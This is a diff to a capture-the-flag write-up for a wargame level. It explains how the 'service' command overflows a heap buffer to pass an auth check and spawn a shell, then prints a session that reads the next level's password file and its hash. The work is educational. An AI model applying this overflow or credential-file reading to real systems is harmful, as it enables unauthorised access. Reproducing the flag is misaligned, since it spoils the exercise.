@@ -1,6 +1,37 @@
-This is a huge binary. After a lot of refactor, it is pretty simple to
-understand.
+$ ./level8
+=> (nil), (nil) 
+=> (Wait for input)
+=> askldjhjka
+=> (nil), (nil) 
+=> sdjafjkh asdlhasfd
+=> (nil), (nil)
 
-It is basically a command interpretter.
-To access to the shell, we need to type 'auth ' then 'service01234566789abcdef'
-and finally 'login'.
+We proceed to disas the main and reassemble the program to get our source code.
+
+As we can observe in the source.c, it's a command interpretter. There's 4 command:
+"auth ",
+"service",
+"reset",
+"login"
+
+We can see that after the "login" command, there's a call to /bin/sh but we need to pass a security first.
+This security is a check on the global variable %auth
+to see if its 9th character is a '\0'.
+
+Thanks to the "service" command which strdup our input into the global variable %service
+we'll be able to overwrite the content of %auth
+which is first initialized with '\0' after the command "auth "
+
+So first, we initialize %auth
+$ ./level8
+=> (nil), (nil) 
+$ "auth "
+=> 0x804a008, (nil) 
+Then we use "service" to overflow on %auth
+$ service123456789123456789123456789123456789
+=> 0x804a008, 0x804a018 
+and then we use "login"
+$ login
+And we got the shell prompt:
+$ cat /home/user/level9/.pass
+=> c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
